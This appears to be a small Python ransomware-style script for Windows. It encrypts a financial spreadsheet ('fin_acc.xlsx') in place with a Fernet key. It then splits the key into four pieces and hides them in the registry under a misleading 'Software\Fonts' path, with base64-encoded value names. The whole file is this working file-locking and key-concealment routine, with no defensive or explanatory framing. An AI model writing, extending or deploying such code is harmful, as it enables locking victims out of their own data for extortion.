from cryptography.fernet import Fernet
import winreg
import base64
import ctypes 

class hideKey():

    def __init__(self, adj_key: list):

        self.adj_key = adj_key
        self.REG_PATH = r'Software\Fonts'
        self.run()

    @staticmethod
    def set_reg(name, value, REG_PATH):
        try:

            winreg.CreateKey(winreg.HKEY_CURRENT_CONFIG, REG_PATH)

            registry_key = winreg.OpenKey(
                winreg.HKEY_CURRENT_CONFIG,
                REG_PATH,
                0,
                winreg.KEY_WRITE
                )

            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(registry_key)

            print(f'Done! Registry written in {REG_PATH}')

        except WindowsError as error:
            print(f"Can't set registry...\nError:{error}")

    def run(self):

        for num in range(4):
            name = base64.b64encode(str(num).encode())
            value = self.adj_key[num]
            hideKey.set_reg(
                name=name.decode(),
                value=value.decode(),
                REG_PATH=self.REG_PATH,
            )

class encryptFile():

    def __init__(self, filename: str, key: str):
        self.filename = filename
        self.key = key

    def run(self):

        self.fernet_class = Fernet(self.key)

        with open(self.filename, "rb") as file:
            data = file.read()
            enc_d = self.fernet_class.encrypt(data)

        with open(self.filename, "wb") as file:
            file.write(enc_d)


class keyGenerator():

    def __init__(self) -> None:
        pass

    @staticmethod
    def gen_key() -> str:
        return Fernet.generate_key()

    @staticmethod
    def adj_key(key) -> list:

        _adj_key = []
        n = 4
        lenght = len(key)
        chars = int(lenght/n)

        if (lenght % n != 0):
            print("Sorry this string cannot"
                  "diveded into" +
                  str(n) +
                  " equal parts.")
        else:
            for i in range(0, lenght, chars):
                _adj_key.append(key[i:i+chars])

        return _adj_key

def is_admin():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except Exception:
            return False

if __name__ == "__main__":

    key = keyGenerator.gen_key()

    # if is_admin():
    encryptFile(
        filename="fin_acc.xlsx",
        key=key,
    ).run()

    hideKey(
        adj_key=keyGenerator.adj_key(key)
    ).run()